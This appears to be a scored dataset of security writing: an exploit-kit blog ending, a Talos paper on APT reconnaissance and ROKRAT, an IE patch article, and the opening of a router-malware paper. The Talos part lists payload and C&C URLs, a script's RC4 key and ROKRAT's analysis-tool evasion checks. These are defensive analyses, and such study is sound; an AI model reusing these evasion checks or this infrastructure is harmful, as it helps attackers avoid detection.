However, even if you happen to stumble across one of these underground communities, it’s still not that easy.  As with many organized crime groups, black hat hackers do not allow easy access into their private circles.  Registration requirements for a lot of these forums are strict, usually requesting internal references as well as links to profiles proving you are in fact “one of them”.  The below image shows a picture of a registration message from exploit.in (translated from Russian) and requests new applicants provide as many details as possible to speed up the process (NOTE: It is ill-advised to navigate to these type of sites unless doing so anonymously within a secure environment).
Registration requirements for exploit.in, a hacker community.",0.019583638494205746
"Exploit kits are not purchased from the author but usually “rented”.  Like legally obtained commercial software, these exploit kits have licenses available for specified lengths of time that guarantee continuous revenue for the author.  The below image depicts the Serenity exploit for sale by the author “Oakley”
Serenity exploit kit for sale in hacker forum.",0.014196998511362469
"Some exploit kits have been leaked to the public and can be acquired with ease through open sources.  However, these kits are typically a few years old and thus have older, less reliable exploits included.  Downloading and using these kits within a test environment can give you additional insight into how the actual exploitation takes place, but please, do not use these kits to spread malware.  Here at Malwarebytes, we DO NOT encourage our readers to test these kits on the internet, but only on private networks for the purpose of research and education.
Conclusion and Protection
Exploit kits pose a serious threat to all computer users ranging from private users to corporate networks.  Unlike the overused and annoying spam that makes its way to your email inbox, exploit kits can be more difficult to detect as they’re often triggered when visiting legitimate, yet hacked, websites.  A perfect example of this was detailed on my last blog post featuring a mimic AV scanner called ‘Malwarebiter’, which blindsided visitors with a malicious Zeus Trojan upon arrival.
Regardless, most of the same general security rules apply.  Using a secure browser and keeping your software updated will prevent a large majority of exploits created by these kits from succeeding.  Let’s emphasize that last part: keep your software updated.  Many of the older exploits in existence are still working simply because of unpatched software.  Ensure you are using auto-update features for all of your computer programs and continue to check our blog as well as other security articles for the latest cyber threats.
In the unfortunate event that an exploit does succeed and malware is installed, it’s important to have reliable anti-malware protection stop the threat before it starts.  There are various paid and free options available from a lot of AV companies, including our own Malwarebytes Anti-Malware.  For additional information on other techniques for protecting yourself from exploit kits, take a look at a great article about Web Exploits by security researcher Jerome Segura.
Be vigilant.",0.016675216052615793
"References
http://media.blackhat.com/bh-us-12/Briefings/Jones/BH_US_12_Jones_State_Web_Exploits_Slides.pdf
http://www.zdnet.com/70-percent-of-exploit-kits-come-from-russia-says-report-7000010182/
http://blog.washingtonpost.com/securityfix/2007/06/the_mother_of_all_exploits_1.html
http://blog.washingtonpost.com/securityfix/2007/10/mapping_the_russian_business_n.html
http://www.securelist.com/en/analysis/204792160/Exploit_Kits_A_Different_View
_______________________________________________________________________________
Joshua Cannell is a Malware Intelligence Analyst at Malwarebytes where he performs research and in-depth analysis on current malware threats. He has over 5 years of experience working with US defense intelligence agencies where he analyzed malware and developed defense strategies through reverse engineering techniques.  His articles on the Unpacked blog feature the latest news in malware as well as full-length technical analysis.  Follow him on Twitter @joshcannell
",0.011980116397454443
VB2017 paper: Modern reconnaissance phase by APT – protection layer,0.009587840687634186
Paul Rascagneres & Warren Mercer,0.010620813718287048
Cisco Talos,0.009965841856186985
Copyright © 2017 Virus Bulletin,0.01004035859515584
"Table of contents
Abstract Case study #1: NATO Case study #2: Dina Bosio Case study #3: Survey time Case study #4: Korean New Year Case study #5: ROKRAT #1 Twitter accounts #2 Yandex accounts #3 MediaFire accounts Mitigation Conclusion References",0.015475165108714162
Abstract,0.009485057568311417
"The Talos researchers are no strangers to APT attacks. During recent research, we observed the ways in which APT actors are evolving and how a reconnaissance phase is included in the infection vector in order to protect valuable zero-day exploits or malware frameworks. Indeed, the development of exploits and complex malware is a big cost from the attacker's point of view, which is why they put a lot of effort into hiding them from analysts and security companies.",0.012731328722723312
"This paper presents five case studies that demonstrate how the infection vector is evolving. We chose five examples from different APT actors, showing that this trend is not related to a single group of attackers, but is in fact global.",0.014799957262687458
"The first case study is that of an
Office
document that includes a Flash object. The Flash object is used to retrieve information about the target system and to send this information to the attackers. If the information matches the expectations of the attacker, the exploit is sent to the infected system.",0.011067679645112238
"The second case study is that of an
Office
document with a macro and JavaScript. The purpose of the JavaScript is to collect information about the target and to send this information to the attacker. If the information matches the expectations of the attacker, the final payload is sent to the infected system.",0.011222660041263266
"The third case study is that of an
Office
document with a macro and PowerShell. The protection mechanism is exactly the same as in the previous case study.",0.014632966655510615
"The fourth case study is that of a Korean threat based on a
Hanword
document. In this case, the infection vector is first used to send information about the targeted system before receiving the final Remote Administration Tool (RAT). If the data is wrong, the RAT cannot be downloaded and the investigation is stopped.",0.013276777303695142
"Finally, we will see that sometimes we can obtain the final payload. We managed to obtain the final RAT of the Korean-targeting threat actor mentioned previously. We named the RAT 'ROKRAT'.",0.014190006580428016
"After the case studies, we will describe some mitigations to help avoid infection.",0.016303987382181306
Case study #1: NATO,0.010693702363259283
SHA‑256: ffd5bd7548ab35c97841c31cf83ad2ea5ec02c741560317fc9602a49ce36a763,0.009741187860453193
Filename: NATO secretary meeting.doc,0.010400701904055398
"The analysed sample is a Microsoft Word document, which contains a Flash object, as shown in Figures 1 and 2.",0.00776297543202531
Figure 1: Screenshot of Microsoft Word document.Figure 2: Flash object.,0.012488184326398977
The first task of the Flash object is to gather information about the system using the flash.system.Capabilities.serverString API and to send this information to the attacker. The following is an example of the output of this function:,0.009117635874965724
A=t&SA=t&SV=t&EV=t&MP3=t&AE=t&VE=t&ACC=f&PR=t&SP=t&SB=f&DEB=t&V=WIN%209%2C0%2C0%2C0&M=Adobe%20Windows&R=1600x1200&DP=72&COL=color&AR=1.0&OS=Windows%20XP&L=en&PT=ActiveX&AVD=f&LFD=f&WD=f&IME=t&DD=f&DDP=f&DTS=f&DTE=f&DTH=f&DTM=f,0.01778058399838811
The values are documented by Adobe in [1]. Some fields are interesting:,0.009643932951666212
"The PT value in the example is ActiveX. This value means that the Flash object is executed through ActiveX (in
Microsoft Office
). If the Flash object is executed outside of
Office
the value is different. This information helps the attacker to identify if the Flash context is good. Generally, security researchers extract embedded objects to analyse them.",0.013985603981866879
The V value provides the Flash version. This information can help the attacker to deliver an exploit that works on the installed Flash version (no zero-day if it's not mandatory).,0.012528028634906985
"The OS value provides the operating system version (
Windows XP
in our case). This value can be used to determine whether the system is legitimate. If the attacker knows that the target uses
Windows 10
but receives
Windows XP
as the OS value, they can conclude that the request was performed by a sandbox system.",0.014635896874688914
Figure 3 is a screenshot of the C&C used to send this information.,0.011789714247020133
Figure 3: C&C used to send information.,0.01359002457990588
"If the data matches the attacker's expectations, the server will send a second Flash object and an additional payload to the infected system (Figure 4).",0.020442663016319473
"Figure 4: If the data matches the attacker's expectations, the server will send a second Flash object and an additional payload to the infected system.",0.01333569809583346
"The new Flash object will be loaded with the LoadBytes() API (this.swf variable) and the payload is passed in an argument in the 'sh' variable (we assume that sh is for shellcode). This case study demonstrates how the attackers protect their exploits, in this case a Flash exploit.",0.013710557851113636
"Thanks to Umbrella Cisco we were able to observe the DNS activity (Figure 5). The campaign started on 29 December 2016 with a very low level of activity. On 16 January, we see an uptick in activity – this is when we started to observe more public samples, which we used for our research purposes.",0.019833831808284463
Figure 5: DNS activity showing an uptick on 16 January.,0.022352145508736543
Case study #2: Dina Bosio,0.009473733720989364
SHA‑256: 2299ff9c7e5995333691f3e68373ebbb036aa619acd61cbea6c5210490699bb6,0.009802782074900152
Filename: National Day Reception (Dina Mersine Bosio Ambassador's Secretary).doc,0.014945357223542177
"This case study revolves around a Microsoft Word document. The document is alleged to have been created by Dina Bosio, an individual whom we believe to be fictitious (see Figure 6).",0.016542298083930818
Figure 6: Dina Bosio profile.,0.013853156454095017
"As can be seen in Figure 7, the document contains a macro.",0.012652001932330736
Figure 7: The document contains a macro.,0.015772923615634427
"The purpose of the macro is to generate and execute a JavaScript document called mailform.js. This document is executed with the argument NPEfpRZ4aqnh1YuGwQd0. This is the RC4 key used by the JavaScript to decrypt itself. Without this key/argument, the JavaScript cannot be executed. If this file is identified on VirusTotal without the context (the macro with the RC4 key) then analysis is impossible.",0.008865087906657854
The purpose of the decrypted payload is to gather information about the targeted system and to download the final RAT (with the .pif extension) if the data meets the attackers' criteria (Figure 8).,0.019679706165429134
Figure 8: The payload gathers information about the targeted system and downloads the final RAT if the data meets the attackers' criteria.,0.015684747056617376
"In this case, the script collects network information, domain information, share information, user information, installed software, and task list.",0.011990494932051954
Case study #3: Survey time,0.012737676805406384
SHA‑256: eb1f47c9f71d3fd2ff744a9454c256bf3248921fbcbadf0a80d5e73a0c6a82de,0.0102895967109633
Filename: survey.xls,0.009191991231175867
"The file in this case study is a Microsoft Excel document with a macro, the purpose of which is to drop and execute a VBS and a PowerShell script (see Figures 9 and 10). As with the previous case study, the purpose of the payload is to collect information about the infected system; Figure 11 shows the information-gathering script.",0.019761497568558606
Figure 9: The document contains a macro.,0.01594206507160656
Figure 10: The purpose of the macro is to drop and execute a VBS and a PowerShell script.,0.013642937181333692
Figure 11: The information-gathering script.,0.018336233330852325
"As in the other cases, if the collected data is good and is what the attacker is looking for, a binary is downloaded and executed on the system.",0.009876349119718686
Case study #4: Korean New Year,0.01185784632152509
SHA‑256: 281828d6f5bd377f91c6283c34896d0483b08ac2167d34e981fbea871893c919,0.009730283023016817
Filename: 5170101-17년_북한_신년사_분석.hwp (5170101-17 __ North Korea _ New Year _ analysis .hwp),0.018972791254795562
"In this case study the infection vector is a Hanword document (HWP). Hanword is a well-known text editor in South Korea, widely used in the public sector (instead of Microsoft Office). The HWP format support OLE objects. The OLE objects are simply compressed with zlib. Figure 12 shows a screenshot of the analysed document.",0.01646176368057728
Figure 12: The analysed document.,0.021165105186036093
"The logo at the bottom of the document is that of the Ministry of Unification. The purpose of the ministry is to work on the unification of North Korea and South Korea. As expected, the HWP document contains OLE objects, as shown in Figure 13.",0.014351543590537807
Figure 13: OLE objects in the HWP document.,0.012728100346337312
The OLE objects are executed when the user clicks on a link in the document. The objects drop two executables onto the disk:,0.012816222135856536
C:\Users\ADMINI~1\AppData\Local\Temp\Hwp (2).exe,0.009975429008016623
C:\Users\ADMINI~1\AppData\Local\Temp\Hwp (3).exe,0.00998136013430484
The first step of the executable is to open a decoy document and present this to the user (Figure 14).,0.02437622121930816
Figure 14: A decoy document is presented to the user.,0.016008126281476742
The next step is to gather information from the system:,0.008518977535298511
Computer name,0.008522673297378658
Username,0.008200037054428178
Execution path,0.007129979022432953
BIOS model (HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData),0.015699268705553604
The purpose appears to be to determine whether the target is suitable for attack. The data is sent to a (compromised) legitimate website of the South Korean government:,0.010679361631495299
www.kgls.or.kr/news2/news_dir/index.php,0.009887177306015515
"If the attackers decide that the victim's profile meets their requirements, a .jpg file is generated. This file is the binary executed on the infected system (the final RAT):",0.013093802975178481
www.kgls.or.kr/news2/news_dir/02BC6B26_put.jpg,0.009666724934509485
(where 02BC6B26 is the ID of the infected machine),0.011302868628396467
"Figure 15, for example, shows a pcap of the communication between an infected machine and the C&C (the pcap comes from VirusTotal).",0.02407857026868243
Figure 15: Communication between an infected machine and the C&C.,0.014256317791696671
The decoded content is as follows:,0.009645899353065923
0F37555F#0#0#0#TEQUILABOOMBOOM#janettedoe#C:\4b20883386665bd205ac50f34f7b6293747fd720d602e2bb3c270837a21291b4#innotek GmbH VirtualBox 1.2,0.009870940661342864
"The first field contains an ID generated on the infected system, the fifth field is the hostname of the VirusTotal sandbox, the sixth field is the username, the seventh field is the execution path, and finally we can see the BIOS version of the VirusTotal sandbox. We can conclude that the sample was executed on a VirusTotal virtual machine.",0.011752992745844626
Case study #5: ROKRAT,0.008933556183184033
"In some cases, we are able to provoke APT actors and obtain the final RAT. This was the case with the Korean actor mentioned in case study #4. As before, the campaign started with two HWP documents.",0.011718575566205924
"The first email was sent from the official email contact of the Korea Global Forum. We assume that the account was compromised and abused by the attacker. The email asks the recipient to complete a form in an attached document (an HWP document), as shown in Figures 16 and 17.",0.012719246522698069
Figure 16: The recipient is asked to complete a form in an attached (HWP) document.,0.01800421621346293
Figure 17: The attached HWP document.,0.01647489424662585
"The second email asks for help from someone in North Korea. In this case, the attackers work on the empathy of the receiver. This email also contains an attached HWP document (Figures 18 and 19).",0.016202807839507116
Figure 18: The second email also contains an HWP document.,0.014248174266103808
Figure 19: The attached HWP document.,0.016951168931830796
"As usual in HWP documents, the file contains OLE objects (compressed with zlib).",0.020004807108142675
Figure 20: The file contains OLE objects.,0.014616946256168828
The document contains an EPS (Encapsulated PostScript) object. This object contains an exploit that is used to execute code thanks to the vulnerability CVE-2013-0808. The purpose is to download a PE file from a compromised website:,0.007600919228081149
http://ac ddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpg,0.010876035792675043
http://discgolfglow[.]com:/wp-content/plugins/maintenance/images/worker.jpg,0.010926798971306106
There is a similar .jpg pattern to the one in the previous case study. We named the downloaded RAT 'ROKRAT'.,0.01472075326605482
"This malware does not work on Windows XP or 2003. If it is executed on these platforms, an infinite loop is executed.",0.010990697122552961
"Figure 21: If the malware is excuted on Windows XP or 2003, an infinite loop is executed.",0.012984251596101615
The next step is to check if there are any analysis tools running on the system.,0.01286877523144847
Figure 22: Checking if analysis tools are running.,0.015358799589040184
"If one of the following applications is running, the malware deduces that the system is a sandbox or an analysis machine:",0.007845631311025003
"'mtool' for
VMware Tools",0.010119465492517854
"'llyd' for
OllyDBG",0.011763209019426513
"'ython' for Python (
Cuckoo Sandbox
for example)",0.017755579966653556
"'ilemo' for
File Monitor",0.008790574468192314
"'egmon' for
Registry Monitor",0.009749431773928507
"'peid' for
PEiD",0.009552705658670724
"'rocex' for
Process Explorer",0.0096754936562915
"'vbox' for
VirtualBox",0.00978497462794925
"'iddler' for
Fiddler",0.012345922742628801
"'ortmo' for
Portmon",0.008582746572540545
"'iresha' for
Wireshark",0.010058933232316214
"'rocmo' for
Process Monitor",0.009666238494744017
"'utoru' for
Autoruns",0.010662027669436913
"'cpvie' for
TCPView",0.008698946940640662
"In this case, the malware performs queries on legitimate websites and starts watching a Japanese anime, as shown in Figure 23.",0.013812448363919372
Figure 23: The malware performs queries on legitimate websites and starts watching a Japanese anime (https://www[.]amazon[.]com/Men-War-PC/dp/B001QZGVEC/EsoftTeam/watchcom.jpg http://www[.]hulu[.]com/watch/559035/episode3.mp4).,0.012587511473586388
We assume that these connections are intended to generate fake IOCs on sandbox systems.,0.016171790052941892
"If the malware is running on an intended system, it is able to initiate communications through three different communication channels:",0.007008917688138494
#1 Twitter accounts,0.009565445723969779
"The malware is able to communicate with the attackers using Twitter via seven different hard-coded Twitter API tokens, as shown in Figure 24.",0.017538519637036676
Figure 24: The malware communicates via seven hard-coded Twitter API tokens.,0.018679695849190492
#2 Yandex accounts,0.008862926522793635
"ROKRAT is able to communicate with the attackers via Yandex. It is able to upload or download files on the Yandex cloud service. The malware contains four hard-coded tokens, as shown in Figure 25.",0.011305300516826433
Figure 25: The malware has four hard-coded Yandex API tokens.,0.01614696330020715
#3 MediaFire accounts,0.00813844774987904
"ROKRAT is able to communicate with MediaFire too. A single API token is hard coded in the analysed sample, as shown in Figure 26.",0.012642397798544036
Figure 26: The malware has a single MediaFire API token.,0.015318559601809056
"Each of the three platforms is legitimate and may be used by organizations in standard, day-to-day work. Additionally, these platform use HTTPS encryption. From an incident response point of view, this could frustrate efficient analysis and remediation of an incursion.",0.014163241108072988
Mitigation,0.008231592818215394
"Windows platforms already include effective mitigation techniques for these vectors. To thwart threat actors that prefer leveraging macros, we recommend disabling macro execution in Microsoft Office. Additionally, PowerShell is becoming more and more popular with APT threat actors, hence we recommend restricting PowerShell execution with Execution Policy GPO. Malicious use of JavaScript and WScript is common too – these can easily be disabled by setting the following registry value:",0.0180632215526515
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings\Enabled => REG_DWORD = 0,0.010456056422631255
"It goes without saying that we also recommend keeping your software, OS and security products up to date and correctly configured.",0.013555808776751443
Conclusion,0.008171308922719556
"The costs of developing a zero-day or complex malware framework is significant. That's why it makes perfect sense for malware actors to protect their investments and secure them from security researchers. Once a complex malware variant is discovered by the security industry, it is of little or no use to the threat actor.",0.012617996857075764
"There is a clear trend towards adding information-gathering mechanisms within the infection vector to avoid leaking valuable code to security analysts. It is likely that many targets of these attacks have already been compromised in the past by the same actors. Hence, the adversary knows the target infrastructure, the network IP ranges, the naming convention of the hostname or the username, the domain name, etc. of the targets they are seeking to infect. The information obtained by these pieces of malware allows the attacker to identify efficiently if the infected system shares the profile of the intended victim. With the benefit of this information, the attackers can perform additional tests before releasing their advanced and valuable malware. This new approach makes the jobs of security analysts and researchers more complex, yet also that little bit more interesting.",0.011291409363807015
References,0.0158494738281566
"[1] http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Capabilities.html.
",0.013321175682600495
"Critical Internet Explorer zero‑day vulnerability patched by Microsoft
Microsoft releases a fix for a zero-day vulnerability that has already been exploited by hackers in targeted attacks against some organisations. Don't delay!",0.007134349669862927
12 Mar 2014 - 06:50AM,0.011259550721323452
Microsoft releases a fix for a zero-day vulnerability that has already been exploited by hackers in targeted attacks against some organisations. Don’t delay!,0.00641281047938469
"For this month’s Patch Tuesday, Microsoft has released five bulletins, tackling a total of 23 different security holes in Microsoft Windows, Internet Explorer and Silverlight.",0.022304874040597
"The most important security update is undoubtedly the one for Internet Explorer, applicable for virtually all versions of the browser, which includes a fix for a zero-day vulnerability (CVE-2014-0322) that has already been exploited by hackers in targeted attacks against some organisations.",0.011720187291226258
"Last month, Microsoft released a temporary fix it tool for the problem, so a proper patch has been keenly anticipated.",0.01567682848499108
"Details of how to take advantage of the security weakness have already been publicised on the net, increasing the chances of further attacks if computer owners do not take action.",0.018366662702919423
"So, what’s the danger if you leave your computer unpatched?",0.012753578713481262
"Well, if you visit a boobytrapped website with a vulnerable version of Internet Explorer it can be tricked into allowing the remote hacker’s code to execute on your PC, gaining the same rights as the user you are logged in as on Windows. In the blink of an eye, your computer could be infected by malware – delivered via an exploit kit.",0.011622874342875011
"In Microsoft Security Bulletin MS14-012, isn’t shy about underlining the importance of the security update – giving it the highest critical rating for Internet Explorer 6, 7, 8, 9, 10, and 11 on affected Windows clients, and “moderate” for the same versions of Internet Explorer on affected Windows servers.",0.013916167340985108
"Of course, if you’re still using a version of Internet Explorer as old as version 6, this is just one of many many problems your organisation may be facing…",0.017733728312484542
"And, this is probably as good a time as any, to remind organisations and home users that are still using creaky old Windows XP that the ageing operating system will no longer be receiving security updates after next month.",0.022670557390095936
"If at all possible, it’s extremely important that you update your operating system as soon as you can, rather than wait until malicious hackers have free reign to exploit it. More details of the end of support for Windows XP can be found on Microsoft’s website.",0.009163960087329559
"Most Windows home users will hopefully be taking advantage of the automatic security updates which will be rolled out to them, but companies often prefer to do some internal testing before distributing patches across their network in case there are any niggles.",0.014700965065669647
"Whatever type of user you are, my advice is to not delay – but install the security updates at your earliest opportunity to better protect your computers and the data stored upon them.",0.012403384886866098
"To learn more about the latest security patches from Microsoft, including the ones for Windows and Silverlight as well as Internet Explorer, be sure to check out Microsoft’s March 2014 Patch Tuesday summary.
",0.01787857322590014
VB2019 paper: Absolutely routed!! Why routers are the new bullseye in cyber attacks,0.01079878146903257
Anurag Shandilya,0.01358404546768932
"K7 Computing, India",0.008568851215510986
"Table of contents
Abstract 1. Introduction 2. Infection vectors 2.1 System misconfiguration Case study: Default credentials 2.2 Known unpatched vulnerabilities Case study: UPnP 2.3 Zero-day vulnerabilities 3. Vulnerabilities 3.1 CVE-2018-14847 Test environment details Analysis Case study 3.2 CVE-2019-1652 Test environment details Analysis Case study 3.3 CVE-2018-10561 4. Common malicious operations on compromised routers 5. IoCs and behavioural changes 5.1 Expected behaviour of a router 5.2 Behavioural and structural changes 5.2.1 CVE-2018-14847 5.2.2 CVE-2019-1652 5.2.3 CVE-2018-10561 5.3 Indicators of compromise 5.3.1 Indicators that can be identified by a non-intrusive security product 5.3.2 Indicators that can be identified by an intrusive security product 6. Detection methods 6.1 Existing solutions 6.2 Proposed solution Conclusion References Appendix: Sample hashes Footnotes",0.01327824765043173
Abstract,0.009485057568311417
"Routers are ubiquitous and highly vulnerable to attack. Despite being the central nervous system of any network, routers are disregarded when it comes to security, as can be proven by the fact that, although vulnerabilities in routers are identified and reported, most devices remain unpatched, making easy targets for cybercriminals. In recent years we have seen threat actors shift their focus from complex operating system- and network-based attacks to comparatively simple router-based ones.",0.011543689421456227
"Other than merely brute-forcing credentials, cyber gangs have been exploiting known and zero-day router vulnerabilities to host malicious code. CVE-2018-14847 is a vulnerability affecting MikroTik RouterOS from v6.29 to v6.42, which allowed arbitrary file read and write over WinBox port 8291, reported in April 2018. Although a patch was available almost immediately, Coinhive, a cryptominer, exploited this vulnerability from July 2018 onwards to inject Monero mining code into the error page served up by the device when a user accessed any HTTP page. CVE-2018-10561 was reported in DZS’ GPON routers, which was then exploited by multiple pieces of router malware including Satori and Hajime to carry out their botnet operations. The Satori malware family exploited this vulnerability to download and execute shell script on the device from the /tmp directory. More recently, CVE-2019-1652 has been reported, affecting Cisco routers and allowing command injection in the router’s certificate generation module. This vulnerability, in combination with credential brute-forcing, could hand over complete control of a router to an adversary. (There is no known malware exploiting this vulnerability at the time of writing this paper.)",0.008318219105715952
"Detailed analyses of these vulnerabilities have demonstrated the startling ease with which routers are being maliciously exploited from both internal networks as well as the Internet. Compromised devices are being used as passive web proxies to snoop traffic, as active web proxies to serve cryptominers (as in the case of Coinhive), or as part of a botnet to inflict distributed denial of service (DDoS) attacks. Since specialized security hardware and software like Network Intrusion Detection and Prevention Systems (NIDS/NIPS) are typically needed to detect router infections, most small and medium-sized businesses and home-users are still vulnerable to such malware attacks.",0.013188826506277396
"This paper will provide detailed analyses of the exploit mechanics of the CVE-2018-14847, CVE‑2018-10561 and CVE-2019-1652 vulnerabilities. We will also discuss the indicators of compromise (IoCs) and behavioural changes on compromised devices which would assist in detection of malware on routers without recourse to NIDS/NIPS. We will also provide solutions for generic detection of attempts to exploit the mentioned vulnerabilities.",0.008667063783293849
1. Introduction,0.009670202428696317
"Since the release of Mirai source code on Hack Forums in September 2016 [1], the threat landscape has spawned a major route-change. Threat actors customized Mirai code, adding device-specific exploits and releasing variants of the malware in the wild. Other malware families, such as TheMoon, which were already active at the time, upped their game to compete in the wild and generate profit. Some malware families were also observed to disinfect a device, only to re-infect it with their own code.",0.013504643193726906
"The Mirai botnet had a very basic element of success: a common and easily exploitable vulnerability, i.e. default credential-guessing, which worked successfully across various devices. The author releasing his source code to the public added to its success and paved a path for more router-targeting malware.",0.01099328540309219
"Router malware has evolved from standalone independent entities, adopting a modular approach, flexible enough to expand their functionalities on-the-fly. But what makes router malware profitable is that a single piece of malware can contain exploits for multiple devices, hence drastically increasing the attack surface.",0.0143336924618499
Malware name,0.008064001602020365
Year of first appearance,0.00929696231663546
Linux/Hydra,0.008513783744266812
2008,0.017153262955631132
Psybot,0.008445577597246734
2009,0.015903252611630725
ChuckNorris,0.011229114636577386
2010,0.011214974672591582
Carna Botnet,0.009520142183994107
2012,0.0151697605015364
lightAidra,0.008980812513856629
2013,0.01469247042878763
Linux.Darlloz,0.0078867156954322
2013,0.01469247042878763
Bashlite,0.008899765533961101
2014,0.011249645636760786
TheMoon,0.008256098194287964
2014,0.011249645636760786
Gafgyt,0.008300430155911531
2015,0.01288141882262095
Moose,0.007922436450361725
2016,0.009534308800455249
Remaiten,0.007035168024161043
2016,0.009534308800455249
Nyadrop,0.008528813907346833
2016,0.009534308800455249
LuaBot,0.00883786350623783
2016,0.009534308800455249
VPNFilter,0.009000034705632709
2016,0.009534308800455249
Linux/IRCTelnet (new Aidra),0.012934134377956541
2016,0.009534308800455249
Mirai,0.008401250263640025
2016,0.009534308800455249
Qbot,0.008830327441810226
2017,0.014007180025539356
Persirai,0.00804554212061126
2017,0.014007180025539356
Tsunami - Amnesia,0.010266504172477209
2017,0.014007180025539356
Satori,0.008977940369766957
2017,0.014007180025539356
IOTroops,0.009322230107707385
2017,0.014007180025539356
Hajime,0.009641964404451864
2018,0.009546204159052274
Hide&Seek,0.008057410128833098
2018,0.009546204159052274
Okiru,0.01070764619137099
2018,0.009546204159052274
Linux.Wifatch,0.009144081335091703
2018,0.009546204159052274
Prowli,0.007766213612160899
2018,0.009546204159052274
SlingShot,0.008365571367655145
2018,0.009546204159052274
Table 1: Year of first appearance of major router malware as per VirusTotal.,0.01817718181752137
Table 1 shows the first occurrences of well-known router malware over the past decade.,0.01771302519828899
"Linux/Hydra, the first-known router malware, used credential brute-forcing to compromise devices as part of a botnet. A rise can be observed in the number of router malware families since 2016, i.e. after Mirai had demonstrated its power and efficacy to the world by launching the biggest DDoS attacks that cyberspace had ever seen.",0.015200135958972738
"Malware like TheMoon, which first manifested in 2014, have evolved over time and made a re-entry onto the scene in 2018 with exploits targeting heterogeneous devices across platforms and architectures. Modularized malware like VPNFilter, reported since 2016, are already compiled with exploits targeting heterogeneous devices, and updated variants with newer exploits are frequently observed.",0.011487504766144352
"Exploits have traditionally been the spark-plug of malware, and this statement holds true for router malware as well. An important factor that comes into play here is that routers are highly vulnerable and easily exploitable as a result of less-focused security research in the early days of design and development.",0.009255514902884232
"This scenario is, of course, changing. With the gain in popularity of router-based malware, more vulnerabilities are being reported in routing devices, router vendors are rushing to release patches to fix them, and threat actors are rushing to compromise more and more unpatched devices.",0.013111090746729892
"In section 2 we shall discuss various infection vectors being utilized by threat actors to gain access to devices, with case studies to showcase their success in compromising devices. In section 3, we will focus on three vulnerabilities CVE-2018-14847, CVE-2018-10561 and CVE-2019-1652 on different devices, two of which are actively being exploited in the wild by malware. Section 4 emphasizes malicious operations that these compromised devices perform, with case studies based on recent malware. In section 5 we pin down the IoCs and behavioural changes on compromised devices. And finally, section 6 provides a commentary on existing detection approaches implemented by various security vendors and proposes a more generic approach which may prove helpful in detecting and mitigating router malware.",0.016071552619820184
2. Infection vectors,0.008264722421379767
"Any weakness in a system which may compromise confidentiality, integrity or availability of information without the user’s knowledge may be termed a vulnerability. A vulnerability can be termed an infection vector if it is exploited by threat actors to compromise devices and spread infections.",0.00895174346676697
"As with other heterogeneous devices, non-socially-engineered infection vectors in routers can be divided into three broad categories:",0.009460252276561443
System misconfiguration,0.006321159732781134
Known unpatched vulnerabilities,0.007213870716722637
Zero-day vulnerabilities,0.006129803542266443
Exploitable vulnerabilities on a router can be present in different layers:,0.00634889227261326
Web interface: there are vulnerabilities present in the default web interface of the device which may lead to information leakage or allow adversaries to execute arbitrary code remotely.,0.006925901511776966
Services accessible over a network: there are vulnerabilities present in network services executing on the device which may be identified/exploited as a result of allowing direct communication with the service without proper validation and access control.,0.00744009111006394
"Services accessible locally on the device: there are vulnerabilities present in services executing on the device, accessible locally only through the web interface or network-exposed service.",0.007852085835928113
In this section we will focus on different categories of infection vectors with a discussion of how these vulnerabilities have been exploited in the past.,0.013981956520111916
2.1 System misconfiguration,0.006603525570838653
"System misconfiguration is one of the most easily exploitable vulnerabilities that threat actors target. This includes issues such as the use of default and easily guessable passwords, and exposed services and ports. Despite all the awareness being created around this issue, it is still common to identify and attribute attacks to system misconfiguration.",0.009167692543449513
Case study: Default credentials,0.007527440710469402
The Mirai botnet can serve as an excellent case study for system misconfiguration. It targets devices that use default access credentials for common and well-known services exposed to the Internet. The Mirai source code originally included 61 hard-coded username and password pairs in clear text (Figure 1).,0.01280416280165364
Figure 1: Hard-coded passwords in Mirai source code (Scanner.c) [A1]1.,0.00712274430538562
"But this was back in 2016. With time, threat actors have evolved their strategies. Nowadays, Mirai variants have extended the credential list to be able to target more devices, and have encoded the list to prevent easy analysis. These variants also include code to exploit vulnerabilities in heterogeneous devices across architectures to spread the infection more aggressively.",0.012914338657658786
2.2 Known unpatched vulnerabilities,0.007031698421813948
"Malware authors are targeting known unpatched vulnerabilities to get a hold of the device. There are two main reasons why this works: vendors have ignored patching the vulnerabilities for various business reasons, and the majority of users have traditionally never cared enough to install updates/patches on the device. There have also been cases wherein the patch provided by the vendor was insufficient to fix the underlying issue.",0.008879004990951955
Case study: UPnP,0.008445346392397357
"Universal Plug and Play (UPnP) is a protocol that allows devices connected to a network to discover and communicate with each other. UPnP-enabled devices, once connected to any network, broadcast a UPnP service discovery request to 239.255.255.250:1900 (Figure 2).",0.01831332092885274
Figure 2: UPnP discovery message over port 1900.,0.02094062381960815
"In 2006, Armijn Hemel identified and reported issues with the implementation of the UPnP protocol allowing internal and external forwarding/port mapping and command execution on the router [2]. In 2013, a security advisory was released reporting a vulnerability in Broadcom UPnP software’s SetConnectionType module [3]. At the time of writing this paper, there are still 281,518 vulnerable devices present over the Internet (Figure 3).",0.010742427774187213
Figure 3: UPnP vulnerable devices (source: Shodan).,0.022462319256710828
"In 2018, two different pieces of malware, BCMUPnP_Hunter and UPnProxy, were reported to be exploiting this vulnerability to compromise devices.",0.010974015392724135
"Using a single exploit, BCMUPnP_Hunter was able to compromise 116 devices from multiple vendors [4]. Figure 4 shows strings in BCMUPnP_Hunter malware used to exploit the UPnP vulnerability. The initial request is sent to the target over port 5341, and if the router accepts the connection, port 1900 is checked and, if enabled, the vulnerability in the SetConnectionType module is exploited to gain access to the device.",0.008477788505504957
Figure 4: Snippet of strings present in BCMUPnP_Hunter sample [A2].,0.006495319060386806
Different variants of the UPnProxy malware were observed in the wild. Initial variants configured the proxy using the UPnP vulnerability for Network Address Translation (NAT) injection. A more recent version had the ability to expose Server Message Block (SMB) ports (139 & 445) from the device in order to compromise them with the Eternal Blue SMB exploit. This showcases how malware on heterogeneous devices across platforms has the potential to wreak havoc.,0.010321345019605688
2.3 Zero-day vulnerabilities,0731814012542968
